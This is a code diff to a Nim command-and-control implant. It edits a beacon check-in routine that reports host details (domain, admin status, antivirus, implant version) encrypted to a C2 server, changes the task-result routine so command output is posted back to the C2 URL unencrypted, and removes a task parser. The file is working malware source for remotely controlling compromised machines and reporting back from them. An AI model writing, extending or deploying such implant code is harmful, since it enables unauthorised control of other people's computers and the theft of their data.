@@ -2,6 +2,8 @@ import httpclient, json, strformat
 import config, crypto
 import times
 import std/parseutils
+import utils
+
 
 let client = newHttpClient()
 
@@ -20,42 +22,31 @@ proc sendCheckin*(id: string): string =
       "domain": "workgroup",
       "is_admin": "no",
       "av_products":"defender",
-      "beacon_start_time":  now(),
-      "first_checkin": now(),
+      "beacon_start_time":  $now(),
+      "first_checkin": $now(),
       "implant_version": IMPLANT_VERSION,
       "beacon_key": PER_BEACON_KEY,
-      "timestamp": now() #like last seen or last activity
-      "status": "Active"
+      "timestamp": $now(), #like last seen or last activity
+      "status": "Active",
     }
 
-    key : seq[byte]
+    let key = hexToBytes(AES_KEY)
 
-    #if now() > checkin_payload["first_checkin"]:
-      #key = hexToBytes(PER_BEACON_KEY)
-    #else:
-      #key = hexToBytes(AES_KEY)
-
-    key = hexToBytes(AES_KEY)
-
-    let enc = encryptJson($payload, key)
-    return client.postContent(C2_URL & CHECKIN_URI, enc) #post request http://127.0.0.1:8080/checkin with enc as body
+    let enc = encryptJson(checkin_payload, $key)
+    return client.postContent(C2_URL & CHECKIN_URI, enc) #post request http://127.0.0.1:8080/api/checkin with enc as body
     #in backend getNextTask(id) -> return the task for the agent as (task_id,cmd)
 
-proc sendTaskResult*(id: string, task_id: string,command: string,result: string): string =
+proc sendTaskResult*(id: string, task_id: string,command: string,output: string): string =
     let payload = %*{
       "agent_id": id,
       "task_id": task_id,
       "command": command,
-      "data": result
+      "data": output
     }
-    let enc = encryptJson($payload, hexToBytes(AES_KEY))
+    let enc = $payload
     return client.postContent(C2_URL & RESULT_URI, enc)
 
 type Task = object
     task_id: string
     command: string
 
-proc parseTask*(raw: JsonNode): Task =
-    #j["task_id"]
-    result.task_id = raw["task_id"].getStr()
-    result.command = raw["commad"].getStr()
